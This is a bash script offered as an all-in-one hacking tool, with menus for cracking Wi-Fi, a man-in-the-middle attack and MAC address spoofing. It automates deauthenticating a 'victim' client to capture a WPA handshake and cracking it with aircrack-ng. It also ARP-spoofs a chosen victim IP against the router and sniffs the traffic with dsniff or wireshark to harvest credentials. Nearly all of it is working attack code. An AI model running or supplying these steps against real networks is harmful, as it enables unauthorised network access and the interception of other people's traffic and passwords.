#!/bin/bash
clear
red="\e[0;91m"
reset="\e[0m"
banner(){
	
echo -ne  """
   █████████      ███████████       ███████
  ███░░░░░███    ░█░░░░░░███      ███░░░░░███
 ░███    ░███    ░     ███░      ███     ░░███
 ░███████████         ███       ░███      ░███
 ░███░░░░░███        ███        ░███      ░███
 ░███    ░███      ████     █   ░░███     ███
 █████   █████    ███████████    ░░░███████░
░░░░░   ░░░░░    ░░░░░░░░░░░       ░░░░░░░



  █████                      ████
 ░░███                      ░░███
 ███████    ██████   ██████  ░███   █████
░░░███░    ███░░███ ███░░███ ░███  ███░░
  ░███    ░███ ░███░███ ░███ ░███ ░░█████
  ░███ ███░███ ░███░███ ░███ ░███  ░░░░███
  ░░█████ ░░██████ ░░██████  █████ ██████
   ░░░░░   ░░░░░░   ░░░░░░  ░░░░░ ░░░░░░

                                           
c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}



"""

}
mitmV2(){


#!/bin/bash
red="\e[0;91m"
reset="\e[0m"
clear
banner(){
echo -e   """

888b     d888      8888888      88888888888      888b     d888 
8888b   d8888        888            888          8888b   d8888 
88888b.d88888        888            888          88888b.d88888 
888Y88888P888        888            888          888Y88888P888 
888 Y888P 888        888            888          888 Y888P 888 
888  Y8P  888        888            888          888  Y8P  888 
888   ^   888        888            888          888   ^   888 
888       888      8888888          888          888       888 



c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}"""
echo " " 

}

interface(){
echo ""
read -p "what is your interface :  "  I
if [[ $I  == ""  ]]; then 
	echo ""
	echo -e "${red}you have to tybe your interface -_- !${reset}"
	sleep 1
	interface
fi
}
check_tools(){
file1=/usr/bin/xterm
file2=/usr/sbin/netdiscover
file3=/usr/share/dsniff
if [[ -f "$file1" || -f "$file2" || -f "$file3"  ]]; then
echo " " 
else
	echo "you dont have the tools ):"
        sleep 0.6
        echo "installing now . . . "
        sleep 1
sudo apt-get install dsniff -y && sudo apt-get install netdiscover -y && sudoapt-get install xterm -y 
clear
fi
}
vic(){
echo '1' > /proc/sys/net/ipv4/ip_forward


echo ''
read -p "Enter IP victem First then IP router : " V R
if [[ $R == "" ]]
then
	echo ' '
	echo -e "${red}you have to tybe victem IP and router IP !  ${reset}"
	sleep 0.9s 
	vic
elif [[ $V == "" ]]
then
	echo ' '
	echo -e "${red}you have to tybe victem IP and router IP !  ${reset}"
	sleep 0.9s
	vic
fi
}
banner
roo=$(whoami)
if [ $roo != root -o $UID == 1000 ];
 then
echo -e  "${red}run it as root !${red}"
sleep 1
exit
fi

echo "hello (: "
sleep 1
check_tools
interface
ro=$(hostname -I | cut -d ' ' -f 1)
sudo timeout 7 netdiscover -r $ro/24
vic
read -p """
{1} > wireshark

{2} > dsniff


choose your sniffing tool ! : """ sn
if [ $sn == 1 -o $sn == wireshark ]
then 

xterm -e sudo arpspoof -i $I -t $V $R -r | xterm -e wireshark -i $I

elif [ $sn == 2 -o $sn == dsniff ]
then
	xterm -e sudo arpspoof -i $I -t $V $R -r | dsniff -i $I
fi
echo -e """
                             
 #    #   ##   #    # ###### 
 #    #  #  #  #    # #      
 ###### #    # #    # #####  
 #    # ###### #    # #      
 #    # #    #  #  #  #      
 #    # #    #   ##   ###### 
                             
                             
 ###### #    # #    #        
 #      #    # ##   #        
 #####  #    # # #  #        
 #      #    # #  # #        
 #      #    # #   ##        
 #       ####  #    #        
                             
    #  #####                 
   #  #     #                
  #         #                
 #     #####                 
  #         #                
   #  #     #                
    #  #####                 
                             
c o d e d by${red} A Z O${reset} | snapchat : ${red}uur_2v${reset} | insta : ${red}r7jhz1${reset} | github : ${red}Az0122${reset}

"""
sleep 0.5
exit
}
macran(){


clear
red="\e[0;91m"
reset="\e[0m"

echo -e  """


███╗   ███╗ █████╗  ██████╗ ██████╗██╗  ██╗██╗   ██╗██████╗ 
████╗ ████║██╔══██╗██╔════╝██╔════╝██║  ██║██║   ██║╚════██╗
██╔████╔██║███████║██║     ██║     ███████║██║   ██║ █████╔╝
██║╚██╔╝██║██╔══██║██║     ██║     ██╔══██║╚██╗ ██╔╝██╔═══╝ 
██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╗██║  ██║ ╚████╔╝ ███████╗
╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝
                                                            
                                                            
coded by ${red}A Z O${reset} | insta : ${red}r7jhz1${reset} | snapchat : ${red}uur_2v${reset} | github : ${red}az0122${reset}


"""
echo 'what is your interface ? : '
echo 'wlan0 , eth0 => 1 '
read -p 'enter here ! : ' inter
if [ $inter = 1 ] ; then

sudo ifconfig wlan0  down
sudo ifconfig wlan0  hw ether 0a:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}
sudo ifconfig wlan0  up

sudo ifconfig eth0  down
sudo ifconfig eth0  hw ether 0a:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}
sudo ifconfig eth0  up

echo '''

Done !




coded by A Z O | insta : r7jhz1 | snapchat : uur_2v | github : az0122

'''
sleep 0.5
ifconfig | grep -i  ether
else
sudo ifconfig $inter down
sudo ifconfig $inter hw ether 0a:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}:${RANDOM:0:2}
sudo ifconfig $inter up
echo '''

Done !




coded by A Z O | insta : r7jhz1 | snapchat : uur_2v | github : az0122

'''
sleep 0.5
ifconfig | grep -i  ether
fi




}
handchack(){
sudo timeout 14 airodump-ng --bssid $bss -c $ch  ${interface}mon
echo -ne "${reset} "
echo " " 
read -p """
if you get the handchack Entet 1
Enter the macaddres for wifi victim :  """ mac
if [ $mac == 1 ]; then 
read -p "Enter the name for the handchack (any name) : " name
sudo aireplay-ng -0 1 -a $bss -c $mac ${interface}mon && sudo timeout 11 airodump-ng --bssid $bss -c $ch -w $name ${interface}mon
echo -ne "${reset} "
echo " " 
read -p """
if you dont get the handchack Enter 1
without (.txt)	
Enter the wordlist : """ wor
echo -ne "${reset} "
echo " "
if [ $wor == 1 ] ; then
handchack
fi
aircrack-ng ${name}-01.cap -w ${wor}.txt 
sudo airmon-ng stop ${interface}mon > /dev/null
banner
echo 'bye (:'
exit
fi
sudo aireplay-ng -0 1 -a $bss -c $mac ${interface}mon && sudo timeout 7 airodump-ng --bssid $bss -c $ch -w aztool ${interface}mon
echo -ne "${reset} "
echo " " 
read -p """
if you dont get the handchack Enter 1 
without (.txt)
Enter the wordlist : """ wor
if [ $wor == 1 ] ; then 
	handchack
fi
}
interface(){
read -p "what is your interface ? : " interface
if [[ $interface == "" ]] ; then
	echo " "
        echo -e "${red}you have to tybe your interface -_- !${reset}"
        sleep 1
        interface
	echo " "
fi

}
wifihacking(){
FILE=/usr/sbin/airodump-ng
FILE1=/usr/sbin/aireplay-ng
FILE2=/usr/sbin/airmon-ng
FILE3=/usr/bin/aircrack-ng

if [[ -f "$FILE" || -f "$FILE1" || -f "$FILE2" || -f "$FILE3" ]]; then
    echo ""
else
        echo "you dont have the tools ):"
        sleep 0.6
        echo "installing now . . . "
        sleep 1 
        sudo apt-get install airodump-ng && sudo apt-get install airmon-ng && sudo apt-get install aireplay-ng && sudo apt-get install aircrack-ng 
fi
#
sudo airmon-ng start $interface > /dev/null
sudo timeout 9 airodump-ng ${interface}mon
echo -ne "${reset} "
echo " " 
read -p "Enter the BSSID and CH : " bss ch
sudo timeout 14 airodump-ng --bssid $bss -c $ch  ${interface}mon
echo -ne "${reset} "
echo " " 
read -p "Enter the macaddres for wifi victim :  " mac
read -p "Enter the name for the handchack (any name) : " name
sudo aireplay-ng -0 1 -a $bss -c $mac ${interface}mon && sudo timeout 11 airodump-ng --bssid $bss -c $ch -w $name ${interface}mon
echo -ne "${reset} "
echo " " 
read -p """
if you dont get the handchack Enter 1
without (.txt)	
Enter the wordlist : """ wor
echo -ne "${reset} "
echo " "
if [ $wor == 1 ] ; then
handchack
fi
aircrack-ng ${name}-01.cap -w ${wor}.txt 
sudo airmon-ng stop ${interface}mon > /dev/null
sleep 3
banner
echo 'bye (:'
exit
}

banner
#chack for root 
roo=$(whoami)
if [ $roo != 'root' ]; then
        echo -ne  "${red}run it as root !${reset}"
	sleep 1 
        exit
fi
echo "hello $HOSTNAME (: "
read -p """
{1} > wifihacking

{2} > mitmV2

{3} > mac_random

choose : """ ch
echo " "
if [[ $ch == 1 ]] ; then 
interface
wifihacking
elif [  $ch == 2 ] ; then
	mitmV2
elif [ $ch == 3 ] ; then
	macran
fi

